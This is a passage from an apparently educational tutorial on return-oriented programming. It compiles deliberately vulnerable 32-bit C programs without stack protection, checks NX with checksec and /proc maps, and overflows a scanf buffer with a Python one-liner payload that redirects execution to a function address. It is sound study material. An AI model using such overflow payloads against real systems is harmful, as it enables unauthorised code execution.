...
The content used for this tutorial will be heavily relying on [6]. The tutorial's objective is to learn about the basic concept of return-oriented programming (ROP).

### Ret-to-libc

Let's start with the following code (`rop3.c`):
...
Checking the security of the binary:
```bash
root@1ea768518d38:~# checksec.sh/checksec --file rop3
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		6	rop3
```

A bit of background from [9]:
...
Returning to the security check we performed on the `rop3` binary, we observe that NX/DEP is enabled thereby we can't place our shellcode neither in stack nor heap. Executing the program prints the following and awaits for a password:

```bash
root@1ea768518d38:~# ./rop3
stack   : 0xffffd850
system(): 0xf7e5e310
printf(): 0xf7e6b410
...
*Our task is to exploit a buffer overflow and print out "Password OK :)"*. To do so, the payload should look like this:
...
We'll be using the following code (`rop4.c`):
...
```
*Since we cannot bypass stack canaries using this method, this program should be compiled with flag telling compiler to turn off stack protector: `gcc -m32 -g -fno-stack-protector -o rop4 rop4.c`.*

Checking the security of the  resulting binary:
```bash
root@e0afd3a3ed3a:~# checksec.sh/checksec --file rop4
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		0	rop4
```

Which informs that the file has NX enabled thereby we can't place our shellcode neither in stack nor heap. This can be double checked by reading `/proc/<number>/maps`:
```bash
root@e0afd3a3ed3a:~# cat /proc/85/maps
08048000-08049000 r-xp 00000000 08:01 2889907                            /root/rop4
08049000-0804a000 r--p 00000000 08:01 2889907                            /root/rop4
0804a000-0804b000 rw-p 00001000 08:01 2889907                            /root/rop4
f7e22000-f7e23000 rw-p 00000000 00:00 0
f7e23000-f7fce000 r-xp 00000000 08:01 1656688                            /lib/i386-linux-gnu/libc-2.19.so
f7fce000-f7fd0000 r--p 001aa000 08:01 1656688                            /lib/i386-linux-gnu/libc-2.19.so
f7fd0000-f7fd1000 rw-p 001ac000 08:01 1656688                            /lib/i386-linux-gnu/libc-2.19.so
...
f7fdc000-f7ffc000 r-xp 00000000 08:01 1656681                            /lib/i386-linux-gnu/ld-2.19.so
f7ffc000-f7ffd000 r--p 0001f000 08:01 1656681                            /lib/i386-linux-gnu/ld-2.19.so
f7ffd000-f7ffe000 rw-p 00020000 08:01 1656681                            /lib/i386-linux-gnu/ld-2.19.so
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
```
Note that the stack is only `rw` (and not executable `x`):
```bash
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
```
...
Since `scanf` does not performs bound checking, we can take control of EIP by overwriting the return address of the function to point to some arbitrary location. To obtain the address of grant, we can either use gdb:
```
...
>>> p &grant
$1 = (void (*)()) 0x80484cd <grant>
```
or simply, grep through the `objdump` of the binary:
```bash
root@e0afd3a3ed3a:~# objdump -d rop4 | grep grant
080484cd <grant>:
 8048511:	e8 b7 ff ff ff       	call   80484cd <grant>
```
Now let’s add a payload that exploits the buffer overflow and modifies the return address to point to `grant`:
```
root@5c6f288fd982:~# (python -c 'print "A"*28 + "\xcd\x84\x04\x08" '; cat -) | ./rop4
Nice try

ls
checksec.sh  exploit.txt  rop1	rop1.c	rop1_noprotection  rop2  rop2.c  rop2_noprotection  rop3  rop3.c  rop4	rop4.c

```
All right, that did it however the code we're starting from is very unrealistic, let's focus on a more realistic one (`rop5.c`):
```C
#include <stdio.h>
#include <string.h>
#include <unistd.h>
...
```bash
root@b94b110731e3:~# objdump -d rop5 | grep grant
080484cd <grant>:
 8048511:	e8 b7 ff ff ff       	call   80484cd <grant>
```
...
Now trying it out:
```bash
PATH="$PATH:/usr/games" # to get cowsay in the path
root@b94b110731e3:~# (python -c 'print "A"*28 + "\xcd\x84\x04\x08" '; cat -) | ./rop5
Nice try
...
### Calling conventions
How do we call `system("/bin/sh")` now?
